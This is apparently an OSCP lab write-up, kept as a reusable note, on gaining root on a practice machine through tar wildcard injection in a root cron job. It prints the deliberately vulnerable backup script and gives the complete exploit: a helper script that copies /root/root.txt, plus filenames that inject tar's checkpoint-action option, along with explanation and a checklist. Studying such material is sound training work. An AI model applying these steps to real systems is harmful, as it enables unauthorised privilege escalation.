---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-07"
related_machines:
  - HA-01
tags:
  - oscp
  - linux-privilege-escalation
  - cron
  - tar
  - wildcard-injection
  - argument-injection
---

# Tar Wildcard Injection

## Overview

**Objective:** Escalate privileges by exploiting a root-owned cron job that passes an attacker-controlled wildcard expansion to GNU tar.

**Affected machine:** HA-01

**Initial account:** `devops`

**Execution context:** Root cron job.

**Vulnerability:** Unquoted wildcard expansion combined with GNU tar checkpoint options.

**Result:** Successful root-level command execution and retrieval of `/root/root.txt`.

## 1. Attack Summary

The target contained a custom cron job that executed a backup script as root every minute.

The backup script changed into a directory writable by `devops` and passed every filename in that directory to GNU tar through an unquoted wildcard.

This allows specially named files to be created that tar interprets as command-line options.

The injected checkpoint action executed the supplied shell script with root privileges.

### Attack chain

```
devops
   |
   v
Enumerate cron jobs
   |
   v
Discover /etc/cron.d/maint
   |
   v
Identify root execution of backup.sh
   |
   v
Inspect backup.sh
   |
   v
Discover unquoted wildcard:
tar ... *
   |
   v
Confirm spool directory is writable
   |
   v
Create root-flag.sh
   |
   v
Create maliciously named files
   |
   v
Root cron executes backup.sh
   |
   v
GNU tar interprets filenames as options
   |
   v
Checkpoint action executes root-flag.sh
   |
   v
Retrieve /root/root.txt
```

## 2. Reconnaissance and Discovery

### 2.1 Identify the custom cron job

Initial enumeration revealed a custom maintenance cron job.

Command:

```
cat -n /etc/cron.d/maint
```

The first output appeared truncated:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&
```

I inspected the actual line using:

```
sed -n '2l' /etc/cron.d/maint
```

Confirmed output:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1$
```

The trailing `$` is `sed`'s line-ending marker, not part of the cron command.

The actual scheduled job:

|Attribute|Value|
|---|---|
|Cron file|`/etc/cron.d/maint`|
|Schedule|Every minute|
|Execution user|`root`|
|Executable|`/opt/maint/backup.sh`|
|Output redirection|`/dev/null`|

Exact cron entry:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

### 2.2 Inspect the scheduled script

Command:

```
cat -n /opt/maint/backup.sh
```

Actual contents:

```
#!/bin/sh
# Root-owned maintenance job (runs from cron as root every minute).
# VULNERABLE BY DESIGN: archives the spool with a wildcard, so attacker-supplied
# filenames like '--checkpoint-action=exec=...' are interpreted by tar as flags
# (GTFOBins: tar wildcard injection).
cd /opt/maint/spool 2>/dev/null || exit 0
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The critical command:

```
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The script uses an unquoted wildcard.

The shell expands `*` into filenames before executing `tar`. Consequently, filenames beginning with `--` can become command-line options.

Because the cron job runs as root, a successfully injected tar option can trigger a command with root privileges.

### 2.3 Inspect ownership and permissions

Command:

```
ls -ld /opt /opt/maint /opt/maint/backup.sh
```

Actual output:

```
drwxr-xr-x 1 root root 4096 Nov  3 14:01 /opt
drwxr-xr-x 1 root root 4096 Nov  5 08:12 /opt/maint
-rwxr-xr-x 1 root root  367 Nov  3 11:18 /opt/maint/backup.sh
```

The backup script and its parent directory were owned by root.

Replacing the backup script was not necessary.

## 3. Confirm the Writable Directory

The cron script changes into:

```
/opt/maint/spool
```

I needed to establish whether the compromised account could create files there.

### 3.1 Inspect directory permissions

Command:

```
ls -ld /opt/maint/spool
```

Actual output:

```
drwxr-xr-x 1 devops devops 4096 Nov  3 14:01 /opt/maint/spool
```

The directory was owned by `devops`.

### 3.2 Inspect existing contents

Command:

```
ls -la /opt/maint/spool
```

Actual output:

```
total 8
drwxr-xr-x 1 devops devops 4096 Nov  3 14:01 .
drwxr-xr-x 1 root   root   4096 Nov  5 08:12 ..
```

The directory contained no existing files relevant to the attack.

### 3.3 Verify write access

Command:

```
test -w /opt/maint/spool && echo "WRITABLE" || echo "NOT WRITABLE"
```

Actual result:

```
WRITABLE
```

### Confirmed prerequisites

|Requirement|Evidence|Result|
|---|---|---|
|Root executes the backup script|`/etc/cron.d/maint`|Confirmed|
|Cron runs periodically|Every minute|Confirmed|
|Backup uses an unquoted wildcard|`tar ... *`|Confirmed|
|GNU tar receives attacker-controlled filenames|Writable spool directory|Confirmed|
|`devops` can create files|Directory owned by `devops`|Confirmed|

At this point, the exploitation path was established.

## 4. Exploitation

### 4.1 Create the root-flag retrieval script

I needed a helper script that would read the root flag and copy it into the directory accessible to `devops`.

Target location:

```
/opt/maint/spool/root-flag.sh
```

Script contents:

```
#!/bin/sh
cat /root/root.txt > /opt/maint/spool/root.txt
chmod 644 /opt/maint/spool/root.txt
```

The script performs two operations:

1. Reads `/root/root.txt` with the privileges of its executing process.
    
2. Writes the contents to `/opt/maint/spool/root.txt` and makes the resulting file readable.
    

#### Target editor limitation

The target did not have the usual text editors installed.

Observed errors:

```
devops@hard:~$ vim /opt/maint/spool/root-flag.sh
-bash: vim: command not found

devops@hard:~$ vi /opt/maint/spool/root-flag.sh
-bash: vi: command not found

devops@hard:~$ nano /opt/maint/spool/root-flag.sh
-bash: nano: command not found
```

I therefore used the shell's `printf` builtin to create the file.

Actual creation command:

```
cd /opt/maint/spool

printf '%s\n' \
'#!/bin/sh' \
'cat /root/root.txt > /opt/maint/spool/root.txt' \
'chmod 644 /opt/maint/spool/root.txt' \
> root-flag.sh

chmod 700 root-flag.sh
```

I reported that the file was created successfully.

### 4.2 Create the tar option filenames

Two specially named files were required.

Command:

```
cd /opt/maint/spool

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root-flag.sh'
```

The resulting directory contained:

```
root-flag.sh
--checkpoint=1
--checkpoint-action=exec=sh root-flag.sh
```

The names have specific meanings to GNU tar:

|Filename|Function|
|---|---|
|`--checkpoint=1`|Enable checkpoint processing at every record|
|`--checkpoint-action=exec=sh root-flag.sh`|Execute the specified shell command when a checkpoint is reached|

The shell expands these filenames into arguments when the root cron job executes:

```
tar -czf /opt/maint/backup.tar.gz *
```

GNU tar interprets the injected filenames as options rather than ordinary archive filenames.

The checkpoint action consequently executes:

```
sh root-flag.sh
```

under the privileges of the root cron process.

### 4.3 Trigger the execution

No manual invocation of the root-owned backup script was necessary.

The cron job already executed every minute:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

I allowed the scheduled job to execute naturally.

The root-flag retrieval script copied the protected file into:

```
/opt/maint/spool/root.txt
```

### 4.4 Retrieve the root flag

Once the cron job had executed, the resulting file could be inspected as `devops`.

Commands:

```
ls -l /opt/maint/spool/root.txt
```

Then:

```
cat /opt/maint/spool/root.txt
```

**Result:** Root flag obtained and submitted (participant-confirmed).

The public root flag value is masked as `IT{FLAG-SECRET}`.

<mark>Validated — successful root-flag retrieval.</mark>

## 5. Cleanup

After retrieving and submitting the flag, the injected filenames and helper script can be removed.

Cleanup command:

```
cd /opt/maint/spool

rm -f -- \
  '--checkpoint=1' \
  '--checkpoint-action=exec=sh root-flag.sh' \
  root-flag.sh
```

The recovered `root.txt` should be retained until its submission is confirmed.

The examination record confirms flag retrieval but does not establish whether cleanup was subsequently performed.

## 6. Technical Explanation

### 6.1 What is wildcard injection?

A wildcard such as:

```
*
```

is expanded by the shell before the receiving program is executed.

For example, if the current directory contains:

```
file1
file2
--checkpoint=1
--checkpoint-action=exec=sh root-flag.sh
```

The shell effectively constructs an argument list containing those filenames.

The receiving program does not automatically know that those arguments originated as filenames.

If the program interprets arguments beginning with `--` as options, attacker-controlled filenames can influence its behavior.

### 6.2 Why GNU tar was vulnerable in this scenario

GNU tar supports checkpoint functionality.

The relevant options are:

```
--checkpoint=N
--checkpoint-action=ACTION
```

The `exec` checkpoint action executes a command when the checkpoint is reached.

The vulnerable backup script passed the expanded wildcard directly to tar:

```
tar -czf /opt/maint/backup.tar.gz *
```

There was no option-terminating `--` separating options from filenames.

Because root executed the command, the injected checkpoint action inherited the privileged execution context.

### 6.3 The underlying security mistakes

The vulnerability required multiple configuration mistakes:

1. A privileged scheduled task processed an attacker-controlled directory.
    
2. The backup script used an unquoted wildcard.
    
3. Filenames were passed directly to a command that recognizes options.
    
4. The resulting command executed with root privileges.
    

The important issue was not simply that tar was installed or that cron ran as root. It was the combination of untrusted filenames and unsafe argument construction in a privileged process.

## 7. Evidence Summary

|Evidence|Actual finding|
|---|---|
|`/etc/cron.d/maint`|Root cron job runs every minute|
|`/opt/maint/backup.sh`|Unquoted wildcard passed to GNU tar|
|`/opt/maint/spool`|Owned by `devops`|
|Write test|`WRITABLE`|
|`root-flag.sh`|Created successfully|
|Tar injection filenames|Created successfully|
|Cron execution|Root retrieval script executed|
|`/root/root.txt`|Retrieved successfully|

## 8. Important Lessons

1. **Inspect custom cron jobs early.** Custom scheduled tasks can reveal more useful attack paths than extensive enumeration of standard SUID binaries.
    
2. **Follow the complete execution chain.** Identify the cron entry, inspect the invoked script, and then inspect every directory and file it consumes.
    
3. **Check ownership and write permissions.** A root-owned script does not need to be writable when its working directory is attacker-controlled.
    
4. **Treat wildcards as argument-generation mechanisms.** An unquoted wildcard can introduce attacker-controlled command-line options.
    
5. **Understand the target utility.** GNU tar checkpoint behavior was the critical component, not cron alone.
    
6. **Do not assume standard utilities are installed.** The target lacked Vim, Vi, and Nano; shell builtins provided a workable alternative.
    
7. **Prefer a controlled proof.** The helper script retrieved the protected flag without requiring an interactive root shell.
    

## 9. Reusable Checklist

- Enumerate custom cron jobs.
    
- Identify privileged scheduled commands.
    
- Inspect the executed script.
    
- Identify wildcards and argument expansion.
    
- Trace every directory used by the script.
    
- Verify whether the initial account can write to those directories.
    
- Identify the utility interpreting the expanded arguments.
    
- Check whether attacker-controlled filenames can become options.
    
- Understand the relevant utility behavior.
    
- Create the required helper script.
    
- Create the specially named files.
    
- Allow the scheduled task to execute.
    
- Retrieve and verify the privileged result.
    
- Clean up injected artifacts.
    

## References

- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
    
- [GNU tar documentation — Checkpoints](https://www.gnu.org/software/tar/manual/html_section/Checkpoints.html)
    

## Related Notes

- [[Difficulty Levels/Hard/HA-01/HA-01 Overview]]
    
- [[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]
    
- [[Reusable PoCs/Linux Privilege Escalation/CAP_SETUID]]
    
- [[Difficulties & Lessons/Tooling and Workflow Mistakes]]